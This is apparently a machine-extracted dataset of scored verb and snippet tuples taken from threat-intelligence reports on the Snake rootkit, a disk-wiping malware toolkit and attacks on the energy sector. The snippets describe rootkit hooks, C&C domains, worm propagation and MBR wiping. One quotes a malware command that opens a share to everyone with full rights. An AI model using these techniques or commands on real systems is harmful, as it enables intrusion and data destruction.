ZwSaveKey\n    •\t ZwReadFile\n    •\t ZwQuerySystemInformation\n    •\t ZwQueryInformationProcess\n    •\t ZwClose\n    •\t ZwTerminateProcess\n    •\t ZwShutdownSystem\n    •\t ObOpenObjectByName\n</list>\n<footer>                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           14</footer>\n\x0cFor example, the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the\ndriver')(0.6, 'hide', '\n\nIn order to hide its components, the driver hooks the following APIs:\n<list>\n    •\t ZwQueryKey\n    •\t ZwEnumerateKey\n    •\t ZwCreateKey\n    •\t ZwSaveKey\n    •\t ZwReadFile\n    •\t ZwQuerySystemInformation\n    •\t ZwQueryInformationProcess\n    •\t ZwClose\n    •\t ZwTerminateProcess\n    •\t ZwShutdownSystem\n    •\t ObOpenObjectByName\n</list>\n<footer>                                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014           14</footer>\n\x0cFor example, the hook handlers of the registry-related APIs will block access to the registry entries that contain the name of the\ndriver')(0.7, 'resolves', ' Some examples are given below, and\na full list of known domains is given in the Appendix D:\n<list>\n      •\t north-area.bbsindex.com\n      •\t winter.site11.com\n      •\t swim.onlinewebshop.net\n      •\t july.mypressonline.com\n      •\t toolsthem.xp3.biz\n      •\t softprog.freeoda.com\n      •\t euassociate.6te.net\n</list>\nAs seen in the traffic dump above, the malware first resolves the domain name of its C&C')(0.3333333333333333, 'respond', '\n\nHere are specific steps:\n<list>\n    •\t   The data it accepts should start from a 10 byte signature with the following rules:\n\n         •\t     the first 8 bytes must all be ASCII characters, the parser calculates their total sum (sum):\n<code>\n                 01         for (int i = 0; i < 8; i++)\n                 02         {\n                 03         \t      if (*(BYTE *)ptrBuffer <= 32 ||\n                 04         \t          *(BYTE *)ptrBuffer >= 128)\n                 05         \t{\n                 06         \t\treturn 0;                                           // if not ASCII, quit\n                 07         \t}\n                 08         \t      sum += *(BYTE *)ptrBuffer;                    // add to sum\n                 09         \t      ++ptrBuffer;                                  // advance buffer pointer\n                 10         }\n</code>\n\n         •\t     9th byte must be equal to sum / 26 + 65\n\n         •\t     10th byte must be equal to 122 - sum % 26\n<code>\n\n                 01         if ((*(BYTE *)ptrBuffer != sum / 26 + 65) ||\n                 02             (*(BYTE *)(ptrBuffer + 1) != 122 - sum % 26))\n                 03         {\n                 04                result = 0;\n                 05         }\n</code>\n   •\t    Starting from the 11th byte, the data must be base64-encoded; the parser decodes that data\n<code>\n           01          base_64_decode(abyBuffer + 10,\n           02                         &ptrDecoded,\n           03                         iMaxLength - 10);\n</code>\n\n    •\t   Once decoded, the decrypted data should contain the aforementioned markers:\n<figure>\n          .text:F6751426              lea          eax, [ebp+dwMarker]                            ; return marker here\n          .text:F6751429              push         eax\n          .text:F675142A              mov          ecx, [ebp+buf_len]                             ; traffic’s buffer length\n          .text:F675142D              push         ecx\n          .text:F675142E              mov          edx, [ebp+abyBuffer]                           ; traffic’s buffer pointer\n          .text:F6751431              push         edx\n          .text:F6751432              call         decrypt_traffic                                ; decrypt traffic first\n          .text:F6751437              test         eax, eax\n          .text:F6751439              jz           short exit                                     ;   if failed, exit\n          .text:F675143B              mov          eax, [ebp+dwMarker]                            ;   check the returned marker\n          .text:F675143E              cmp          eax, _DEADBEAF                                 ;   _DEADBEAF dd 0DEADBEAFh\n          .text:F6751444              jnz          short exit                                     ;   if not 0xDEADBEAF, exit\n          .text:F6751446              cmp          [ebp+dwNextDword], 0C001BA5Eh                  ;   check next DWORD\n          .text:F675144D              jnz          short next                                     ;   if not 0xC001BA5E, exit\n</figure>\n\n   •\t    When the traffic is authenticated, its contents is then parsed by using “GET”, “POST”, “http://”, “HTTP/”,\n         “Content-Length”, “Connection”, “close” tags, in order to retrieve HTTP requests\n\n   •\t    SMTP traffic is also parsed, only by using “MAIL “, “RCPT “ tags in order to retrieve SMTP characteristics\n</list>\n\n\n         <footer>                                                 BAE Systems Applied Intelligence: Snake Rootkit Report 2014   18</footer>\n\x0cBy observing such behaviour, one might wonder why the driver is expecting HTTP or SMTP clients? Why does it act like HTTP/SMTP\nserver processing client traffic, and serving back normal responses as per the protocol?\n\nFor example, in HTTP the driver will respond with messages like “HTTP/1.1 200 OK” or “HTTP/1.1 500 Server Error”')(0.8, 'hide', ' If the device name is Null, Beep, tcpip or Nsiproxy, it will activate\nitself by enabling its hooks designed to hide the presence of Snake on a system, set up its access control lists and the messaging\nsystem')(1.0, 'started', '\nWhen the dropper file was executed, it started a second instance of itself with “-i” as an argument, and then terminated')(0.6666666666666666, 'contain', ' The tool is dropped and installed by another\nexecutable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual\ndestruction commands to be executed')(0.8461538461538461, 'contains', ' The tool is dropped and installed by another\nexecutable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual\ndestruction commands to be executed')(0.45454545454545453, 'starts', ' If “igfxtrayex.exe” is run with no parameters, it creates and starts a copy of itself with\nthe “–i” argument')(0.2, 'creates', ' If “igfxtrayex.exe” is run with no parameters, it creates and starts a copy of itself with\nthe “–i” argument')(1.0, 'calls', ' There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread\nattempts to guess passwords for SMB connections')(0.6, 'sends', ' There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread\nattempts to guess passwords for SMB connections')(0.4444444444444444, 'guess', ' There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread\nattempts to guess passwords for SMB connections')(0.3333333333333333, 'sends', ' Upon initial connection, the victim sends the string, "HTTP/1.1 GET /dns?\n\\x00." The controller then responds with the string "200 www.yahoo.com!\\x00" (for "sensvc.exe" and "msensvc.exe") or with the string "RESPONSE 200 OK!!" (for\n"netcfg.dll")')(0.375, 'responds', ' Upon initial connection, the victim sends the string, "HTTP/1.1 GET /dns?\n\\x00." The controller then responds with the string "200 www.yahoo.com!\\x00" (for "sensvc.exe" and "msensvc.exe") or with the string "RESPONSE 200 OK!!" (for\n"netcfg.dll")')(0.7142857142857143, 'discover', " This\ntool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and\ngateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks")(0.5294117647058824, 'allowing', " This\ntool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and\ngateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks")(0.10526315789473684, 'add', " This\ntool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and\ngateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks")(0.2222222222222222, 'open', " This\ntool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and\ngateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks")(1.0, 'perform', ' This proxy tool has basic backdoor functionality, including the ability to fingerprint the\nvictim machine, run remote commands, perform directory listings, perform process listings, and transfer files')(0.5714285714285714, 'fingerprint', ' This proxy tool has basic backdoor functionality, including the ability to fingerprint the\nvictim machine, run remote commands, perform directory listings, perform process listings, and transfer files')(0.28, 'has', ' This proxy tool has basic backdoor functionality, including the ability to fingerprint the\nvictim machine, run remote commands, perform directory listings, perform process listings, and transfer files')(0.5, 'run', ' This proxy tool has basic backdoor functionality, including the ability to fingerprint the\nvictim machine, run remote commands, perform directory listings, perform process listings, and transfer files')(0.6666666666666666, 'overwriting', '\n\nDestructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record')(0.5, 'renders', '\n\nDestructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record')(0.8571428571428571, 'reports', ' Once the wiper has been uploaded, the malware reports its status back to one of\nthe four C2 IP addresses')(0.8823529411764706, 'generating', ' The “-s” instance dropped and executed\n“igfxtrayex.exe”, created “net_ver.dat”, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses')(0.5, 'executed', ' The “-s” instance dropped and executed\n“igfxtrayex.exe”, created “net_ver.dat”, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses')(0.16666666666666666, 'created', ' The “-s” instance dropped and executed\n“igfxtrayex.exe”, created “net_ver.dat”, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses')(0.5, 'dropped', ' The “-s” instance dropped and executed\n“igfxtrayex.exe”, created “net_ver.dat”, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses')(0.23529411764705882, 'includes', ' It includes functionality such as file transfer, system survey, process\nmanipulation, file time matching and proxy capability')(0.4, 'run', ' If the password is correctly guessed, a file share is established and file is copied and run on the newly-infected\nhost')(1.0, 'installed', '\n\nProxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443')(0.36363636363636365, 'listen', '\n\nProxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443')(0.5714285714285714, 'sent', ' Each message sent to\nand from this implant is preceded with its length, then XOR encoded with the byte 0x1F')(1.0, 'perform', ' The listener can also perform arbitrary code execution and execute commands on the command line')(0.5, 'execute', ' The listener can also perform arbitrary code execution and execute commands on the command line')(0.2, 'wiping', ' The malware uses several methods to access shares on the remote systems to\nbegin wiping files')(0.5, 'access', ' The malware uses several methods to access shares on the remote systems to\nbegin wiping files')(0.75, 'changes', ' Once successful, the malware uploads a copy of the wiper file “taskhostXX.exe”, changes the file-time\nto match that of the built-in file “calc.exe”, and starts the remote process')(0.6, 'starts', ' Once successful, the malware uploads a copy of the wiper file “taskhostXX.exe”, changes the file-time\nto match that of the built-in file “calc.exe”, and starts the remote process')(0.8, 'begin', ' Based on the\nusername/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to\nupload a copy of the wiper and begin the wiping process on these remote systems')(1.0, 'access', ' Based on the\nusername/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to\nupload a copy of the wiper and begin the wiping process on these remote systems')(0.8571428571428571, 'upload', ' Based on the\nusername/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to\nupload a copy of the wiper and begin the wiping process on these remote systems')(0.4166666666666667, 'starts', '\n\n\n<list>\nName: iissvr.exe\n\nSize: 114688 bytes (114.7 KB)\n\nMD5: E1864A55D5CCB76AF4BF7A0AE16279BA\n\nPE Compile Time: 2014-11-13 02:05:35\n</list>\n\n\nThis file, when executed, starts a listener on localhost port 80')(0.7647058823529411, 'listens', '\n\nListening Implant: During installation of this tool, a portion of the binaries is decrypted using AES, with a key derived from the phrase "National Football League."\nAdditionally, this implant listens for connections on TCP port 195 (for "sensvc.exe" and "msensvc.exe") and TCP port 444 (for "netcfg.dll")')(0.2, 'spread', ' It connects home every five minutes to send log data\nback to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445')(0.9090909090909091, 'send', ' It connects home every five minutes to send log data\nback to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445')(0.5, 'connects', ' It connects home every five minutes to send log data\nback to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445')(0.3181818181818182, 'is', '\n\nDestructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim\nmachine’s recovery')(0.2, 'destroy', '\n\nDestructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim\nmachine’s recovery')(0.6666666666666666, 'wipes', ' (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines\nwill continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.) If the actor has\nuser-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable')(1.0, 'destroyed', ' (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines\nwill continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.) If the actor has\nuser-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable')(0.6666666666666666, 'started', ' The “WinsSchMgmt” service\nexecuted the file with “-k” as an argument, which started another instance of the file using “-s” as an argument')(0.5454545454545454, 'executed', ' The “WinsSchMgmt” service\nexecuted the file with “-k” as an argument, which started another instance of the file using “-s” as an argument')(0.5384615384615384, 'create', ' Checking for existing shares via “\\\\hostname\\admin$\\system32” and “\\\\hostname\\shared$\\system32” or create a new share “cmd.exe /q /c net\nshare shared$=%SystemRoot% /GRANT:everyone, FULL”')(0.5, 'Checking', ' Checking for existing shares via “\\\\hostname\\admin$\\system32” and “\\\\hostname\\shared$\\system32” or create a new share “cmd.exe /q /c net\nshare shared$=%SystemRoot% /GRANT:everyone, FULL”')(0.2857142857142857, 'is', '\n\n\n<list>\nName: igfxtrayex.exe\n\x0cSize: 249856 bytes (249.9 KB)\n\nMD5: 760C35A80D758F032D02CF4DB12D3E55\n\nPE Compile Time: 2014-11-24 04:11:08\n</list>\n\n\nThis file is destructive malware: a disk wiper with network beacon capabilities')(0.6923076923076923, 'sends', ' The controller sends the byte "!" (0x21) to end the network connection')(0.35714285714285715, 'created', '\n\n\n<list>\nName: net_ver.dat\n\nSize: 4572 bytes (4.6 KB) (size will vary)\n\nMD5: 93BC819011B2B3DA8487F964F29EB934 (hash will vary)\n</list>\n\n\nThis is a log file created by the dropper, and appended to as the scans progress')(0.2, 'contains', ' This tool contains five components – a listening implant, lightweight backdoor,\nproxy tool, destructive hard drive tool, and destructive target cleaning tool')(1.0, 'installed', ' The second instance of the dropper file\ninstalled itself as the “WinsSchMgmt” service with “-k” as a command line argument, started the service, and then terminated')(0.47368421052631576, 'started', ' The second instance of the dropper file\ninstalled itself as the “WinsSchMgmt” service with “-k” as a command line argument, started the service, and then terminated')(0.8333333333333334, 'accepts', ' The tool also accepts new scan tasking\nwhen it connects to C2')(0.7142857142857143, 'serves', ' This file serves as a dropper')(0.375, 'drops', ' It drops destructive malware: “igfxtrayex.exe”')(0.6, 'connect', ' If a connection to the IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all\nthree IP addresses have been attempted')(0.4, 'is', '\n\nLightweight Backdoor: This is a backdoor listener that is designed as a service DLL')(1.0, 'makes', ' After 10 minutes, the “igfxtrayex.exe” makes three copies of itself and places them in the same directory from which it was executed')(0.5714285714285714, 'uses', '\n\nSMB Worm Tool: This worm uses a brute force authentication attack to propagate via Windows SMB shares')(0.2, 'send', ' One is to send spear phishing\nemails, where a link to a malicious website or a malicious attachment is delivered using social engineering\ntechniques')(0.14285714285714285, 'is', ' The second method, which is gaining traction, is watering hole attacks, where the attacker infects a\nwebsite that has a high likelihood of being visited by the intended victim')(0.2, 'locks', '\n\n    It is also clear that the energy sector is not exempt from the generic attacks that every company faces, such\n    as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details')(0.5, 'steal', '\n\n    It is also clear that the energy sector is not exempt from the generic attacks that every company faces, such\n    as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details')(0.7, 'creating', '\n\n  The dropper component is responsible for creating all the required files on the system, registering a service\n  called “TrkSvr” in order to start itself with Windows')(0.625, 'registering', '\n\n  The dropper component is responsible for creating all the required files on the system, registering a service\n  called “TrkSvr” in order to start itself with Windows')(0.375, 'start', '\n\n  The dropper component is responsible for creating all the required files on the system, registering a service\n  called “TrkSvr” in order to start itself with Windows')(0.4090909090909091, 'send', ' For example, some malware\nsamples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might\nattract attention')(1.0, 'provides', '\n\n    The back door provides full remote access to the compromised computers, allowing for extraction of any data')(0.5, 'allowing', '\n\n    The back door provides full remote access to the compromised computers, allowing for extraction of any data')(0.3157894736842105, 'preventing', ' This halted machinery, preventing oil tankers from loading for eight hour till the unaffected\n    backup code was reinstalled on the PLCs')(1.0, 'halted', ' This halted machinery, preventing oil tankers from loading for eight hour till the unaffected\n    backup code was reinstalled on the PLCs')(0.14285714285714285, 'Spreading', ' Spreading through infected\n  portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the\n  Internet')(0.8571428571428571, 'infect', ' Spreading through infected\n  portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the\n  Internet')(0.7142857142857143, 'rendering', ' The malware deletes all files\n\n\n\n\n                                     <footer>       Page 27</footer>\n\x0c                                                              <header>  Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n   on a computer and then deletes the master boot record, rendering the computer unusable')(0.7333333333333333, 'finding', ' The attacks started in late 2009 and were directed\n  at finding project details and financial information about oil and gas field exploration and bids')(0.6, 'communicated', '\n\n  On compromised computers a common Backdoor.Trojan was installed that communicated back to the\n  C&C server, allowing remote access to the computer')(0.5, 'allowing', '\n\n  On compromised computers a common Backdoor.Trojan was installed that communicated back to the\n  C&C server, allowing remote access to the computer')(1.0, 'copy', ' It also attempts to copy itself to accessible network shares\n  and execute itself remotely if successfully copied')(0.5714285714285714, 'execute', ' It also attempts to copy itself to accessible network shares\n  and execute itself remotely if successfully copied')(0.18181818181818182, 'send', ' Since most employees use laptops, the malware can use location awareness to detect if the\ncompromised computer is outside of the corporate network and send the data once it’s directly connected to the\nInternet, such as from a Wi-Fi hotspot at an airport')(0.05555555555555555, 'use', ' Since most employees use laptops, the malware can use location awareness to detect if the\ncompromised computer is outside of the corporate network and send the data once it’s directly connected to the\nInternet, such as from a Wi-Fi hotspot at an airport')(0.2, 'render', ' Disttrack’s secondary goal may have\n  been to steal valuable information from infected computers, but the main intent was to render the computers\n  unusable by wiping the operating system and master boot record, causing disruption and downtime at the\n  targeted company')(0.8888888888888888, 'wiping', ' Disttrack’s secondary goal may have\n  been to steal valuable information from infected computers, but the main intent was to render the computers\n  unusable by wiping the operating system and master boot record, causing disruption and downtime at the\n  targeted company')(0.8571428571428571, 'steal', ' Disttrack’s secondary goal may have\n  been to steal valuable information from infected computers, but the main intent was to render the computers\n  unusable by wiping the operating system and master boot record, causing disruption and downtime at the\n  targeted company')(0.7, 'make', ' Tricks like these, to make the detection of the malware more\n  difficult, are now frequently used in modern targeted attacks')(1.0, 'gathers', ' After that comes the discovery phase, where the attacker gathers\n    passwords and maps the internal network')(0.6666666666666666, 'download', ' The malware chosen\nwas a variant of the Poison Ivy Trojan Backdoor.Darkmoon and, in some minor cases, Trojan droppers that would\ndownload additional malware')(0.5789473684210527, 'was', ' The malware chosen\nwas a variant of the Poison Ivy Trojan Backdoor.Darkmoon and, in some minor cases, Trojan droppers that would\ndownload additional malware')(0.14285714285714285, 'spread', ' Besides this, it also spread through network\n  shares, a printer spooler vulnerability, an old Windows RPC (remote procedure calls) vulnerability and a known\n  password in the WinCC database')(0.7777777777777778, 'began', ' As far as we know today, the Stuxnet operation began in November 2005 with the registration\n  of the command and control (C&C) servers used in the attacks')(0.35714285714285715, 'upload', ' The simple attacks compress the files and upload them through FTP or through a HTTP POST request\nto a remote drop server')(1.0, 'compress', ' The simple attacks compress the files and upload them through FTP or through a HTTP POST request\nto a remote drop server')(1.0, 'targeted', ' The early version of Stuxnet targeted the S7-\n  417 PLCs and modified its valve settings')(0.8, 'modified', ' The early version of Stuxnet targeted the S7-\n  417 PLCs and modified its valve settings')(0.6666666666666666, 'uses', '\n\n  Stuxnet is a sophisticated piece of malware, which uses seven vulnerabilities to spread and infect its targets')(0.8571428571428571, 'swap', ' This can enable the attacker to\nswap an update of legitimate software for a maliciously crafted version')(1.0, 'act', ' In\nsuch cases, a previously compromised computer in the DMZ can act as a proxy, forwarding all the collected data')(0.8333333333333334, 'forwarding', ' In\nsuch cases, a previously compromised computer in the DMZ can act as a proxy, forwarding all the collected data')(0.6, 'delete', ' On the USB drive itself, the malware would hide its own files and even delete\n  itself from it after three successful propagations')(0.6666666666666666, 'hide', ' On the USB drive itself, the malware would hide its own files and even delete\n  itself from it after three successful propagations')(0.3157894736842105, 'executed', '\n  To hide its activity even further, Stuxnet executed slightly different infection routines depending on the security\n  software installed on the target')(0.2857142857142857, 'contained', '\n\nThe emails all contained malicious attachments')(1.0, 'collects', ' The malware collects file names and starts overwriting them\n  with a JPEG image or 192KB blocks of random data')(0.2222222222222222, 'install', '\n\nOne of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local\nstorage for saved accounts and sniff the network for passwords')(0.42857142857142855, 'dump', '\n\nOne of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local\nstorage for saved accounts and sniff the network for passwords')(0.8571428571428571, 'search', '\n\nOne of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local\nstorage for saved accounts and sniff the network for passwords')(0.5714285714285714, 'sniff', '\n\nOne of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local\nstorage for saved accounts and sniff the network for passwords')(0.6153846153846154, 'push', '\n\n  By acquiring user credentials and gaining access to the domain controller the attackers were able to push the\n  malware on to many systems before they triggered the destructive payload')(0.6, 'acquiring', '\n\n  By acquiring user credentials and gaining access to the domain controller the attackers were able to push the\n  malware on to many systems before they triggered the destructive payload')(0.8571428571428571, 'used', ' The attackers used a Trojan to gain access to the control for the gas pipelines')(0.5, 'restart', '\n\nThe social engineering messages concentrated mainly around the following two themes:\n<list>\nE-books and newspapers:\n•\t E-Book.pdf.exe\n•\t BusinessWeek.pdf.exe\n•\t Financial Times E-Paper.pdf.exe\n•\t The Economist Print Edition.pdf.exe\n•\t The NY Times In Print.pdf.exe\nFree desktop tools:\n•\t Babylon9 - Greek.exe\n•\t Google Desktop Translator.exe\n•\t SMS Free Sender Desktop.exe\n•\t BBC iPlayer.exe\n•\t Sticky Notes Desktop.exe\n</list>\nOnce installed, the back door would create a registry run key in order to restart with Windows and connect to\none of three C&C servers located in Greece')(1.0, 'create', '\n\nThe social engineering messages concentrated mainly around the following two themes:\n<list>\nE-books and newspapers:\n•\t E-Book.pdf.exe\n•\t BusinessWeek.pdf.exe\n•\t Financial Times E-Paper.pdf.exe\n•\t The Economist Print Edition.pdf.exe\n•\t The NY Times In Print.pdf.exe\nFree desktop tools:\n•\t Babylon9 - Greek.exe\n•\t Google Desktop Translator.exe\n•\t SMS Free Sender Desktop.exe\n•\t BBC iPlayer.exe\n•\t Sticky Notes Desktop.exe\n</list>\nOnce installed, the back door would create a registry run key in order to restart with Windows and connect to\none of three C&C servers located in Greece')(0.6428571428571429, 'connect', '\n\nThe social engineering messages concentrated mainly around the following two themes:\n<list>\nE-books and newspapers:\n•\t E-Book.pdf.exe\n•\t BusinessWeek.pdf.exe\n•\t Financial Times E-Paper.pdf.exe\n•\t The Economist Print Edition.pdf.exe\n•\t The NY Times In Print.pdf.exe\nFree desktop tools:\n•\t Babylon9 - Greek.exe\n•\t Google Desktop Translator.exe\n•\t SMS Free Sender Desktop.exe\n•\t BBC iPlayer.exe\n•\t Sticky Notes Desktop.exe\n</list>\nOnce installed, the back door would create a registry run key in order to restart with Windows and connect to\none of three C&C servers located in Greece')(0.25, 'installed', '\n\nThe social engineering messages concentrated mainly around the following two themes:\n<list>\nE-books and newspapers:\n•\t E-Book.pdf.exe\n•\t BusinessWeek.pdf.exe\n•\t Financial Times E-Paper.pdf.exe\n•\t The Economist Print Edition.pdf.exe\n•\t The NY Times In Print.pdf.exe\nFree desktop tools:\n•\t Babylon9 - Greek.exe\n•\t Google Desktop Translator.exe\n•\t SMS Free Sender Desktop.exe\n•\t BBC iPlayer.exe\n•\t Sticky Notes Desktop.exe\n</list>\nOnce installed, the back door would create a registry run key in order to restart with Windows and connect to\none of three C&C servers located in Greece')(0.7142857142857143, 'plan', '\n\nSome groups carefully plan watering hole attacks')(0.26666666666666666, 'become', ' The\n  payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup')(0.4666666666666667, 'contained', ' All of the emails contained the same\n    Trojan.Dropper disguised as an attachment with the filename AVP.dll')(0.75, 'disguised', ' All of the emails contained the same\n    Trojan.Dropper disguised as an attachment with the filename AVP.dll')(0.5714285714285714, 'sending', '\n\n  The reporter component is responsible for sending back a HTTP GET request to the C&C server')(0.8181818181818182, 'use', ' In some instances\nthey might even use zero-day\nvulnerabilities to spread further into\nthe network')(0.07692307692307693, 'spread', ' This allows\n    malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet')(1.0, 'compromises', ' The attacker usually compromises the network by delivering targeted\nmalware to vulnerable systems or employees')(0.8181818181818182, 'delivering', ' The attacker usually compromises the network by delivering targeted\nmalware to vulnerable systems or employees')(1.0, 'get', ' Details of this attack\n    are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA\n    network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty\n    program module')(1.0, 'bypass', ' This might allow the traffic to bypass perimeter security and\nreceive less scrutiny')(0.6666666666666666, 'receive', ' This might allow the traffic to bypass perimeter security and\nreceive less scrutiny')(0.75, 'compromising', '\n\n  The attackers started by compromising public facing Web servers through SQL injection and installing Web\n  shells on them')(0.625, 'recorded', ' To avoid detection by personnel monitoring the human machine\n  interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played\n  those back in a loop')(0.36363636363636365, 'played', ' To avoid detection by personnel monitoring the human machine\n  interface (HMI) of the plant, the threat recorded measurement readings during normal operation and played\n  those back in a loop')(0.4444444444444444, 'infect', ' This allowed the worm to infect\n  computers whenever the engineer exchanged the project files')(0.7777777777777778, 'jumping', ' This could allow the malware to be\nmanually introduced to the destination network, without the knowledge of the carrier, essentially jumping air gaps\ninto isolated networks')(1.0, 'introduced', ' This could allow the malware to be\nmanually introduced to the destination network, without the knowledge of the carrier, essentially jumping air gaps\ninto isolated networks')(0.5454545454545454, 'move', ' This allowed them to move on to other internal computers using the gathered passwords')(0.75, 'used', ' The attack was carried out over eight days and used the same infected Microsoft\n   Word document in every instance')(0.8181818181818182, 'provided', ' The back door provided full access to the\n    compromised computers')(0.5, 'went', '\n</section>\n<section>\n  <heading>2003</heading>\n    In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours\n    due to a Slammer worm infection')(0.2727272727272727, 'sent', '\n\n   As an example, the subject line “Wage Data 2012” was used in 944 emails, sent from 26 different email addresses\n   to targets in nine different sectors')(0.46153846153846156, 'using', ' By using IP address filters before infecting\nany visitor of such sites, the attacker can reduce the number of infected systems and bring it to a manageable\nquantity which can be assessed manually at another time')(0.6, 'find', ' This allowed the attacker to find and extract valuable\n  information')(0.6, 'extract', ' This allowed the attacker to find and extract valuable\n  information')(0.75, 'sniff', ' Once they had control over the server they used common hacking tools to harvest local\n\n\n\n\n                                        <footer>      Page 11</footer>\n\x0c                                                           <header>     Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n  passwords, dump password hashes, sniff authentication messages and exploit internal active directory\n  configuration')(0.16666666666666666, 'harvest', ' Once they had control over the server they used common hacking tools to harvest local\n\n\n\n\n                                        <footer>      Page 11</footer>\n\x0c                                                           <header>     Targeted Attacks Against the Energy Sector</header>\n\n\n\n\n  passwords, dump password hashes, sniff authentication messages and exploit internal active directory\n  configuration')(0.7, 'wiping', ' At the end Disttrack finishes the computer off by wiping the\n  master boot record with the same data')(0.4, 'make', ' Although wiping is also frequently used to destroy evidence of the attack and make forensics\n  more difficult')(0.8333333333333334, 'destroy', ' Although wiping is also frequently used to destroy evidence of the attack and make forensics\n  more difficult')(0.3333333333333333, 'gains', ' Once the victim installs the genuine looking\nupdate, the attacker effectively gains control over the computer')(0.3888888888888889, 'posing', '\n\n    The malware itself drops a malicious Downloader “clbcatq.dll” into a newly created “wuauclt” directory, posing\n    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious\n    code in Windows')(0.5, 'load', '\n\n    The malware itself drops a malicious Downloader “clbcatq.dll” into a newly created “wuauclt” directory, posing\n    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious\n    code in Windows')(1.0, 'drops', '\n\n    The malware itself drops a malicious Downloader “clbcatq.dll” into a newly created “wuauclt” directory, posing\n    as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious\n    code in Windows')(0.7142857142857143, 'infect', ' Once the attackers have\nsuccessfully managed to create\nand distribute their own package,       \nthey can easily infect all connected\nsystems at once')(0.6666666666666666, 'reports', ' It reports the\n  domain name, IP address and number of files overwritten')(0.6, 'resumed', ' A few days later the group resumed the watering hole attack again,\nthis time using a different exploit')(0.7058823529411765, 'infect', ' In addition, it is able to infect Step7\n  project files, which are used to control Programmable Logic Controllers (PLCs)')(0.5833333333333334, 'came', ' Number of emails targeting the company per day</caption>\nThe spear phishing emails came from 234 spoofed addresses')(0.5, 'posing', ' These can be performed either at the same\nphysical location, posing as a genuine Wi-Fi hotspot or through supply chain attacks')(0.5625, 'focused', ' The later version of the threat focused on the S7-315 PLCs,\n  manipulating the spinning frequency of the rotating motors')(0.625, 'manipulating', ' The later version of the threat focused on the S7-315 PLCs,\n  manipulating the spinning frequency of the rotating motors')(0.7368421052631579, 'learn', '\nSimple system commands can help the attacker to learn about installed security tools, saved links to internal\n\n\n\n\n                                      <footer>               Page 26</footer>\n\x0c                                                    <header>           Targeted Attacks Against the Energy Sector</header>\n\n\n\n\nplatforms and local address books')(1.0, 'know', '\n\nAt the end of the discovery phase the attackers should know the internals of the infected networks and have\nidentified systems with interesting data or with connected industrial control systems')(0.9166666666666666, 'identified', '\n\nAt the end of the discovery phase the attackers should know the internals of the infected networks and have\nidentified systems with interesting data or with connected industrial control systems')(0.9, 'drops', ' The module then drops a legitimate and digitally signed device driver that\n  provides low level disk access from user space')(0.2727272727272727, 'used', '\n </cover>\n\x0c                                                               <header>     Targeted Attacks Against the Energy Sector</header>\n\n\n<section>\n\n<heading>Spear phishing attacks in the energy sector</heading>\n    Spear phishing is, along with watering hole attacks, one of the most common attack vectors used to\n    attack companies')(0.5, 'making', '\n\n  Part of the malware code was signed with 